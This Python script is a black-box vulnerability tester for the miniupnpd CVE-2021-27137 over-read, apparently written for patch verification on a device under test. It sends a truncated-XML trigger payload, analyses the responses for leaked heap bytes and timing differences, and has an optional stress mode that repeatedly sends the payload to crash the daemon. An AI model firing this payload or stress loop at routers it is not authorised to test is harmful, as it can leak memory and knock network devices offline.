#!/usr/bin/env python3
"""
CVE-2021-27137 miniupnpd Black-Box Tester

Detects the minixml.c buffer over-read WITHOUT requiring:
  - Source code access
  - SSH/console access
  - Any credentials

Only requires: network access to the UPnP port (default 5000) on the DUT.

Detection methods:
  1. Response leak detection — truncated XML may cause heap bytes to appear
     in the HTTP response (error messages, reflected attribute values)
  2. Crash detection — repeated rapid payloads increase probability of
     hitting an unmapped page boundary (stress mode)
  3. Timing anomaly — over-read on large heap allocations may cause
     measurable latency differences vs. a well-formed request
  4. Response differential — compare error responses from valid-but-rejected
     XML vs. truncated XML; differences suggest parser processed garbage

Usage:
  python3 miniupnpd_cve_blackbox.py 192.168.1.1
  python3 miniupnpd_cve_blackbox.py 192.168.1.1 --port 5000
  python3 miniupnpd_cve_blackbox.py 192.168.1.1 --stress --rounds 100
"""

import argparse
import socket
import string
import sys
import time


# ═══════════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════════

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"

TOOL_VERSION = "1.0.0"

SOAP_ACTION = "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"

# Printable ASCII characters that are "expected" in HTTP/XML responses
EXPECTED_CHARS = set(string.printable)


# ═══════════════════════════════════════════════════════════════════════
# Payloads
# ═══════════════════════════════════════════════════════════════════════

# Payload that triggers the over-read
EXPLOIT_PAYLOAD = '<element attribute='

# A "control" payload — malformed but does NOT trigger the over-read
# (missing close tag, but attribute is well-formed)
CONTROL_MALFORMED = '<element attribute="value"'

# Valid SOAP for baseline
VALID_SOAP = (
    '<?xml version="1.0"?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
    's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body>'
    '<u:GetExternalIPAddress xmlns:u="'
    'urn:schemas-upnp-org:service:WANIPConnection:1">'
    '</u:GetExternalIPAddress>'
    '</s:Body></s:Envelope>'
)


# ═══════════════════════════════════════════════════════════════════════
# Network Helpers
# ═══════════════════════════════════════════════════════════════════════

def send_upnp_request(host, port, body, timeout=5):
    """
    Send HTTP POST to UPnP endpoint.
    Returns (response_bytes, elapsed_ms) or (None, elapsed_ms) on connection failure.
    """
    http_request = (
        f"POST /ctl/IPConn HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: text/xml; charset=\"utf-8\"\r\n"
        f"SOAPAction: \"{SOAP_ACTION}\"\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )

    start = time.time()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        sock.sendall(http_request.encode())

        response = b""
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            pass
        sock.close()
        elapsed = (time.time() - start) * 1000
        return response, elapsed
    except (ConnectionRefusedError, ConnectionResetError, OSError):
        elapsed = (time.time() - start) * 1000
        return None, elapsed
    except socket.timeout:
        elapsed = (time.time() - start) * 1000
        return b"", elapsed


def check_port_open(host, port, timeout=3):
    """Quick TCP port check."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════
# Detection Methods
# ═══════════════════════════════════════════════════════════════════════

def find_leaked_bytes(response_bytes):
    """
    Look for non-printable / unexpected bytes in the response that
    indicate heap data leaking into the output.
    Returns list of (offset, byte_value) for suspicious bytes.
    """
    if not response_bytes:
        return []

    suspicious = []
    # Skip HTTP headers — look only at body
    body_start = response_bytes.find(b"\r\n\r\n")
    if body_start == -1:
        body_start = 0
    else:
        body_start += 4

    body = response_bytes[body_start:]

    for i, byte in enumerate(body):
        char = chr(byte) if byte < 128 else None
        if byte > 127:
            # High bytes (0x80-0xFF) are unusual in XML/HTTP error responses
            suspicious.append((body_start + i, byte))
        elif byte < 0x20 and byte not in (0x09, 0x0A, 0x0D):
            # Control characters (except tab, newline, carriage return)
            suspicious.append((body_start + i, byte))

    return suspicious


def analyze_response_differential(exploit_response, control_response):
    """
    Compare responses between exploit payload and control payload.
    If exploit response contains significantly more data or unexpected
    content, the over-read is leaking heap data.
    """
    findings = []

    if exploit_response is None and control_response is None:
        return findings

    if exploit_response is None:
        findings.append("Exploit payload caused connection failure (possible crash)")
        return findings

    exploit_len = len(exploit_response) if exploit_response else 0
    control_len = len(control_response) if control_response else 0

    # Length difference
    if exploit_len > control_len + 50:
        findings.append(
            f"Exploit response ({exploit_len}B) significantly larger than "
            f"control ({control_len}B) — possible heap leak (+{exploit_len - control_len}B)"
        )

    # Content difference — look for data in exploit response not in control
    if exploit_response and control_response:
        # Find body portions
        exp_body_start = exploit_response.find(b"\r\n\r\n")
        ctl_body_start = control_response.find(b"\r\n\r\n")
        exp_body = exploit_response[exp_body_start+4:] if exp_body_start != -1 else exploit_response
        ctl_body = control_response[ctl_body_start+4:] if ctl_body_start != -1 else control_response

        # If exploit body has content that control doesn't
        if len(exp_body) > len(ctl_body) + 20:
            extra = exp_body[len(ctl_body):]
            if any(b > 127 or (b < 0x20 and b not in (0x09, 0x0A, 0x0D)) for b in extra):
                findings.append(
                    f"Exploit response contains extra non-printable bytes "
                    f"(likely leaked heap data)"
                )

    return findings


def stress_test(host, port, rounds, delay=0.05):
    """
    Send exploit payload rapidly to try to trigger a crash.
    The over-read's address depends on heap layout; under memory pressure
    or with ASLR, repeated attempts may eventually hit unmapped memory.
    Returns (crashed: bool, rounds_completed: int, details: str)
    """
    crashed_at = None

    for i in range(rounds):
        response, elapsed = send_upnp_request(host, port, EXPLOIT_PAYLOAD, timeout=2)

        if response is None:
            # Connection refused — daemon may have crashed
            # Wait and retry to distinguish crash from transient failure
            time.sleep(0.5)
            if not check_port_open(host, port, timeout=2):
                crashed_at = i + 1
                break

        if delay > 0:
            time.sleep(delay)

    if crashed_at:
        return True, crashed_at, f"Daemon stopped responding after {crashed_at} payloads"

    return False, rounds, f"Daemon survived all {rounds} payloads"


# ═══════════════════════════════════════════════════════════════════════
# Main Test Flow
# ═══════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2021-27137 miniupnpd black-box tester (no SSH/code required)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Detection approach:
  This CVE is a buffer READ overflow. Instead of relying on crashes,
  we detect it by analyzing HTTP responses for leaked heap data and
  comparing behavior between exploit vs. control payloads.

Examples:
  python3 miniupnpd_cve_blackbox.py 192.168.1.1
  python3 miniupnpd_cve_blackbox.py 192.168.1.1 --stress --rounds 200
  python3 miniupnpd_cve_blackbox.py 192.168.1.1 --port 5000 --verbose
        """,
    )
    parser.add_argument("target", help="DUT IP address")
    parser.add_argument("--port", type=int, default=5000, help="UPnP port (default: 5000)")
    parser.add_argument("--stress", action="store_true", help="Run stress test (many rapid payloads)")
    parser.add_argument("--rounds", type=int, default=100, help="Stress test rounds (default: 100)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show detailed response data")
    parser.add_argument("--version", action="version", version=f"%(prog)s {TOOL_VERSION}")

    args = parser.parse_args()

    print(f"\n{'='*60}")
    print(f" CVE-2021-27137 miniupnpd Black-Box Tester v{TOOL_VERSION}")
    print(f" Target: {args.target}:{args.port}")
    print(f" Method: Response analysis (no SSH/credentials required)")
    print(f"{'='*60}\n")

    # ─── Pre-check ───
    print(f"  {CYAN}[CHECK]{RESET} Port {args.port} connectivity...", end=" ")
    if not check_port_open(args.target, args.port):
        print(f"{RED}CLOSED{RESET}")
        print(f"\n  ERROR: Port {args.port} not open. miniupnpd may not be running.")
        sys.exit(1)
    print(f"{GREEN}OPEN{RESET}")

    findings = []
    evidence_of_vuln = False

    # ─── Test 1: Baseline ───
    print(f"\n{'─'*60}")
    print(f" Test 1: Baseline (valid SOAP request)")
    print(f"{'─'*60}\n")

    baseline_resp, baseline_time = send_upnp_request(args.target, args.port, VALID_SOAP)
    if baseline_resp:
        print(f"  {GREEN}[OK]{RESET} Got response ({len(baseline_resp)} bytes, {baseline_time:.0f}ms)")
        if args.verbose:
            print(f"  Response: {baseline_resp[:200]}")
    else:
        print(f"  {YELLOW}[WARN]{RESET} No response to valid SOAP (endpoint may differ)")

    # ─── Test 2: Control malformed ───
    print(f"\n{'─'*60}")
    print(f" Test 2: Control (malformed XML but no over-read trigger)")
    print(f"{'─'*60}\n")

    control_resp, control_time = send_upnp_request(args.target, args.port, CONTROL_MALFORMED)
    if control_resp:
        print(f"  {GREEN}[OK]{RESET} Got response ({len(control_resp)} bytes, {control_time:.0f}ms)")
        if args.verbose:
            print(f"  Response: {control_resp[:200]}")
    else:
        print(f"  {CYAN}[INFO]{RESET} No response (connection closed, {control_time:.0f}ms)")

    # ─── Test 3: Exploit payload ───
    print(f"\n{'─'*60}")
    print(f" Test 3: Exploit payload (truncated attribute after '=')")
    print(f"{'─'*60}\n")

    exploit_resp, exploit_time = send_upnp_request(args.target, args.port, EXPLOIT_PAYLOAD)
    if exploit_resp is None:
        print(f"  {RED}[ALERT]{RESET} Connection failed — daemon may have crashed!")
        findings.append("Connection failure on exploit payload")
        evidence_of_vuln = True
    elif exploit_resp:
        print(f"  {CYAN}[INFO]{RESET} Got response ({len(exploit_resp)} bytes, {exploit_time:.0f}ms)")
        if args.verbose:
            print(f"  Response: {exploit_resp[:300]}")

        # Check for leaked bytes
        leaked = find_leaked_bytes(exploit_resp)
        if leaked:
            print(f"  {RED}[ALERT]{RESET} Found {len(leaked)} suspicious non-printable bytes in response!")
            evidence_of_vuln = True
            findings.append(f"{len(leaked)} non-printable bytes in exploit response (heap leak)")
            if args.verbose:
                for offset, byte_val in leaked[:10]:
                    print(f"    Offset {offset}: 0x{byte_val:02x}")
        else:
            print(f"  {GREEN}[OK]{RESET} No suspicious bytes in response")
    else:
        print(f"  {CYAN}[INFO]{RESET} Empty response (connection closed cleanly, {exploit_time:.0f}ms)")

    # ─── Test 4: Response differential ───
    print(f"\n{'─'*60}")
    print(f" Test 4: Response differential (exploit vs control)")
    print(f"{'─'*60}\n")

    diff_findings = analyze_response_differential(exploit_resp, control_resp)
    if diff_findings:
        for f in diff_findings:
            print(f"  {RED}[ALERT]{RESET} {f}")
            findings.append(f)
            evidence_of_vuln = True
    else:
        print(f"  {GREEN}[OK]{RESET} No significant difference between exploit and control responses")

    # ─── Test 5: Timing analysis ───
    print(f"\n{'─'*60}")
    print(f" Test 5: Timing analysis (5 exploit vs 5 control)")
    print(f"{'─'*60}\n")

    exploit_times = []
    control_times = []
    for _ in range(5):
        _, t = send_upnp_request(args.target, args.port, EXPLOIT_PAYLOAD, timeout=3)
        exploit_times.append(t)
        _, t = send_upnp_request(args.target, args.port, CONTROL_MALFORMED, timeout=3)
        control_times.append(t)
        time.sleep(0.1)

    avg_exploit = sum(exploit_times) / len(exploit_times)
    avg_control = sum(control_times) / len(control_times)
    print(f"  Exploit avg: {avg_exploit:.1f}ms | Control avg: {avg_control:.1f}ms")

    if avg_exploit > avg_control * 2 and avg_exploit > 50:
        print(f"  {YELLOW}[WARN]{RESET} Exploit payload takes significantly longer (possible over-read processing)")
        findings.append(f"Timing anomaly: exploit {avg_exploit:.0f}ms vs control {avg_control:.0f}ms")
    else:
        print(f"  {GREEN}[OK]{RESET} No significant timing difference")

    # ─── Test 6: Stress test (optional) ───
    if args.stress:
        print(f"\n{'─'*60}")
        print(f" Test 6: Stress test ({args.rounds} rapid payloads)")
        print(f"{'─'*60}\n")

        print(f"  Sending {args.rounds} exploit payloads rapidly...", end=" ", flush=True)
        crashed, completed, detail = stress_test(args.target, args.port, args.rounds)

        if crashed:
            print(f"{RED}CRASHED{RESET}")
            print(f"  {RED}[ALERT]{RESET} {detail}")
            evidence_of_vuln = True
            findings.append(detail)
        else:
            print(f"{GREEN}SURVIVED{RESET}")
            print(f"  {GREEN}[OK]{RESET} {detail}")

    # ─── Test 7: Post-test liveness ───
    print(f"\n{'─'*60}")
    print(f" Post-test: Daemon liveness check")
    print(f"{'─'*60}\n")

    time.sleep(1)
    if check_port_open(args.target, args.port):
        print(f"  {GREEN}[OK]{RESET} Daemon still responding on port {args.port}")
    else:
        print(f"  {RED}[ALERT]{RESET} Daemon no longer responding!")
        evidence_of_vuln = True
        findings.append("Daemon stopped responding after test sequence")

    # ─── Verdict ───
    print(f"\n{'='*60}")
    print(f" VERDICT")
    print(f"{'='*60}\n")

    if evidence_of_vuln:
        print(f"  {RED}{BOLD}LIKELY VULNERABLE{RESET}")
        print(f"  Evidence found:")
        for f in findings:
            print(f"    - {f}")
        print(f"\n  Recommendation: Apply SDK patch 3076")
        print(f"  (3076_miniupnpd_fix_CVE-2021-27137_minixml_overflow.patch)")
        sys.exit(1)
    else:
        print(f"  {YELLOW}{BOLD}INCONCLUSIVE{RESET}")
        print(f"  No crash or heap leak detected in responses.")
        print(f"  This does NOT guarantee the fix is applied — CVE-2021-27137 is a")
        print(f"  read overflow that may not produce observable black-box symptoms.")
        print()
        print(f"  For definitive verification, use one of:")
        print(f"    - miniupnpd_cve_verify.py --source <build_tree>")
        print(f"    - miniupnpd_cve_verify.py --dut <ip> --dut-pass <pw>  (needs SSH)")
        print(f"    - Check miniupnpd version: >= 2.3.10 means fixed")
        sys.exit(2)


if __name__ == "__main__":
    main()
